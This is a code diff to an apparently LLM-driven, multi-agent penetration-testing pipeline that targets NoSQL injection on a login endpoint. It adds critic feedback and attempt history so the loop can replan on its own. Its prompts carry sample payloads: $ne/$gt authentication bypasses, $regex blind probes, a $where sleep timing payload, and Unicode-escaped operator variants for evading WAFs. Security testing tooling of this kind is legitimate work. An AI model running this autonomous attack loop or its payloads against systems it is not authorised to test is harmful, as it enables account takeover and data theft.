@@ -68,6 +68,9 @@ async def main():
         planner_output: Optional[Any]
         attack_results: Optional[List[Any]]
         critic_decision: Optional[str]
+        critic_reasoning: Optional[str]  # NEW: Store critic's reasoning
+        critic_suggestions: Optional[str]  # NEW: Store critic's suggestions
+        previous_attempts: List[dict]  # NEW: Track all previous attempts
         final_report: Optional[str]
         iteration_count: int
         fields: List[str]
@@ -113,7 +116,30 @@ Return the scanner tool inputs with:
                 "entry_point": result["scanner_tool_inputs"]['endpoint'],
                 "fields": result["scanner_tool_inputs"]['fields']}
 
-    async def planner_agent(state: FullPentestState):        
+    async def planner_agent(state: FullPentestState):
+        """Generate payloads with feedback from previous iterations."""
+        
+        # Build context about previous attempts
+        previous_context = ""
+        if state.get("previous_attempts"):
+            previous_context = "\n=== PREVIOUS ATTEMPTS SUMMARY ===\n"
+            for i, attempt in enumerate(state["previous_attempts"], 1):
+                previous_context += f"\nIteration {i}:\n"
+                previous_context += f"Payloads tested: {len(attempt.get('payloads', []))}\n"
+                previous_context += f"Results: {attempt.get('summary', 'N/A')}\n"
+        
+        # Include critic feedback if available
+        feedback_context = ""
+        if state.get("critic_suggestions"):
+            feedback_context = f"""
+=== CRITIC FEEDBACK FROM LAST ITERATION ===
+Reasoning: {state.get('critic_reasoning', 'N/A')}
+
+Suggestions: {state.get('critic_suggestions', 'N/A')}
+
+IMPORTANT: Use this feedback to generate DIFFERENT payloads that address the identified issues.
+"""
+        
         prompt = f"""
 You are a Penetration Testing Planner Agent creating NoSQL injection payloads.
 
@@ -126,22 +152,35 @@ You are a Penetration Testing Planner Agent creating NoSQL injection payloads.
 === GOAL ===
 {state['goal']}
 
-Based on context above, generate 5 specific NoSQL injection payloads to test.
+=== ITERATION COUNT ===
+{state['iteration_count']}
+
+{previous_context}
+
+{feedback_context}
+
+Based on the context above, generate 5 specific NoSQL injection payloads to test.
 Each payload should be ready to send in a POST request body.
 
-Target different NoSQL injection techniques as you see fit:
-1. Blind boolean-based injection
-2. Timing-based injection
-3. Authentication bypass
-4. Query operator injection
-5. JavaScript injection
+{"IF THIS IS NOT YOUR FIRST ITERATION: Analyze the feedback and previous attempts. Generate DIFFERENT payloads that address the specific issues mentioned. DO NOT repeat payloads that already failed." if state['iteration_count'] > 0 else ""}
+
+Target different NoSQL injection techniques:
+1. Authentication bypass (e.g., {{"$ne": null}}, {{"$gt": ""}})
+2. Boolean-based blind injection (e.g., {{"$regex": "^a.*"}})
+3. Timing-based injection (e.g., {{"$where": "sleep(5000)"}})
+4. Query operator injection (e.g., {{"$nin": []}}, {{"$exists": true}})
+5. JavaScript injection (e.g., {{"$where": "this.username == 'admin'"}})
 
 Each payload must include:
-- field_name: Which field to inject into (e.g., "username", "password")
-- payload: The actual injection string
+- field_names: List of fields to inject into (matching the detected fields)
+- payloads: List of injection strings/JSON objects (one per field, in order)
 - description: What vulnerability/technique this tests
 
-Return the endpoint URL and 5 payloads.
+CRITICAL: Make payloads progressively more sophisticated based on iteration count and feedback.
+Early iterations: Simple bypasses
+Later iterations: Advanced evasion, encoding, operator combinations
+
+Return the endpoint URL and 5 NEW payloads.
 """
         
         result = await call_ollama_with_json(
@@ -168,10 +207,10 @@ Return the endpoint URL and 5 payloads.
             
             try:
                 field_names = payload_obj["field_names"]
-                payloads = payload_obj["payloads"]
+                payloads_list = payload_obj["payloads"]
 
                 parsed_payloads = []
-                for item in payloads:
+                for item in payloads_list:
                     try:
                         parsed = json.loads(item)
                         parsed_payloads.append(parsed)
@@ -213,7 +252,7 @@ Return the endpoint URL and 5 payloads.
         return {"attack_results": attack_results}
 
     async def critic_agent(state: FullPentestState):
-        """Evaluate results and decide next action."""
+        """Evaluate results and decide next action with detailed feedback."""
         
         prompt = f"""
 You are a Penetration Test Critic Agent evaluating attack results.
@@ -221,14 +260,17 @@ You are a Penetration Test Critic Agent evaluating attack results.
 === GOAL ===
 {state['goal']}
 
-=== PAYLOADS USED ===
-{json.dumps(state['planner_output'], indent=2)}
-
-=== ATTACK RESULTS ===
-{json.dumps(state['attack_results'], indent=2)}
-
 === ITERATION COUNT ===
 {state['iteration_count']}
+
+=== CURRENT PAYLOADS USED ===
+{json.dumps(state['planner_output'], indent=2)}
+
+=== CURRENT ATTACK RESULTS ===
+{json.dumps(state['attack_results'], indent=2)}
+
+=== PREVIOUS ATTEMPTS (if any) ===
+{json.dumps(state.get('previous_attempts', []), indent=2) if state.get('previous_attempts') else "No previous attempts"}
 
 Analyze the results and decide the next action:
 
@@ -241,14 +283,29 @@ Analyze the results and decide the next action:
 - 200 status with authentication tokens or session cookies
 - Response contains target data (e.g., CTF flag, admin access)
 - Access granted to restricted resources
+- Response differs from normal failed login (different length, headers, etc.)
 
 **Evaluation Criteria:**
 - Has the goal been achieved?
-- Are we making progress?
-- Should we gather more info or try different payloads?
+- Are we making progress? (different responses, status codes, error messages)
+- What patterns do you see in failures? (WAF blocking, input validation, sanitization)
+- What hasn't been tried yet?
 - Have we exhausted reasonable attempts?
 
-Provide your decision, clear reasoning, and specific suggestions for improvement.
+**If choosing "replan", provide SPECIFIC, ACTIONABLE suggestions:**
+- Which payload types to try next (be specific about operators, techniques)
+- What encoding or evasion methods to use
+- Which fields to target differently
+- What patterns in responses suggest next steps
+- Specific payload examples to try
+
+**Example good suggestions:**
+- "Try Unicode encoding for $ operator (\\u0024ne instead of $ne)"
+- "Responses show 'invalid user' - try $exists operator on username field"
+- "401 errors suggest authentication logic - try $in operator with admin user array"
+- "Try nested operators: {{\\"$not\\": {{\\"$ne\\": null}}}}"
+
+Provide your decision, clear reasoning, and SPECIFIC suggestions for improvement.
 """
         
         result = await call_ollama_with_json(
@@ -257,8 +314,22 @@ Provide your decision, clear reasoning, and specific suggestions for improvement
             CriticOutput,
         )
         
+        # Store current attempt in history
+        current_attempt = {
+            "iteration": state["iteration_count"],
+            "payloads": state["planner_output"]["payloads"],
+            "results": state["attack_results"],
+            "summary": result.get("reasoning", "N/A")
+        }
+        
+        previous_attempts = state.get("previous_attempts", [])
+        previous_attempts.append(current_attempt)
+        
         return {
             "critic_decision": result["decision"],
+            "critic_reasoning": result.get("reasoning", ""),
+            "critic_suggestions": result.get("suggestions", ""),
+            "previous_attempts": previous_attempts,
             "iteration_count": state["iteration_count"] + 1
         }
 
@@ -273,10 +344,13 @@ You are a Penetration Test Report Writer creating a comprehensive security asses
 === GOAL ===
 {state['goal']}
 
-=== ALL PAYLOADS TESTED ===
+=== ALL ITERATIONS ===
+{json.dumps(state.get('previous_attempts', []), indent=2)}
+
+=== FINAL PAYLOADS TESTED ===
 {json.dumps(state['planner_output'], indent=2)}
 
-=== ATTACK RESULTS ===
+=== FINAL ATTACK RESULTS ===
 {json.dumps(state['attack_results'], indent=2)}
 
 [ROLE & BACKGROUND]
@@ -285,19 +359,25 @@ You are the **Report Writer Agent**, a concise technical writer specializing in 
 
 [TASK OBJECTIVE]
 
-Using the attempt history and the confirmed successful payload, produce a concise yet insightful report that includes:
+Using the attempt history and the confirmed successful payload (or failure analysis), produce a concise yet insightful report that includes:
 
 1. **Executive Summary**
     - One-paragraph overview of objectives and outcome.
 2. **Methodology**
     - Briefly describe each phase (Scanning → Planning → Attacking → Evaluation → Critique).
+    - Note the iterative approach with {state['iteration_count']} iterations.
 3. **Key Findings**
-    - Bullet-list of tested entry points, observed failure modes, and the one that succeeded.
-4. **Successful Exploit Details**
+    - Bullet-list of tested entry points, observed failure modes, and the one that succeeded (if any).
+    - Include insights from each iteration.
+4. **Successful Exploit Details** (if applicable)
     - Show the final payload mapped to each field, explain why it worked.
-5. **Security Implications & Recommendations**
+    - Note which iteration succeeded.
+5. **Failed Attempts Analysis** (if no success)
+    - Summarize what was tried across all iterations.
+    - Explain why attacks failed (WAF, input validation, etc.).
+6. **Security Implications & Recommendations**
     - Outline the vulnerability's impact and suggest remediation steps.
-6. **Lessons Learned & Next Steps**
+7. **Lessons Learned & Next Steps**
     - Note any patterns (e.g., WAF quirks, filtering) and propose further testing or defensive measures.
 
 [OUTPUT FORMAT]
@@ -321,7 +401,11 @@ No Additional text.
         """Route based on critic's decision."""
         decision = state["critic_decision"]
         
+        print(f"\n[CRITIC DECISION]: {decision}")
+        print(f"[ITERATION]: {state['iteration_count']}")
+        
         if decision == "replan":
+            print(f"[FEEDBACK]: {state.get('critic_suggestions', 'N/A')[:200]}...")
             return "planner_agent"
         elif decision == "success":
             return "report_writer"
@@ -369,12 +453,13 @@ No Additional text.
             "planner_output": None,
             "attack_results": None,
             "critic_decision": None,
+            "critic_reasoning": None,  # NEW
+            "critic_suggestions": None,  # NEW
+            "previous_attempts": [],  # NEW
             "final_report": None,
             "iteration_count": 0,
             "entry_point": "",
             "fields": [],
-            
-            
         },
         config={"recursion_limit": 50}
     )
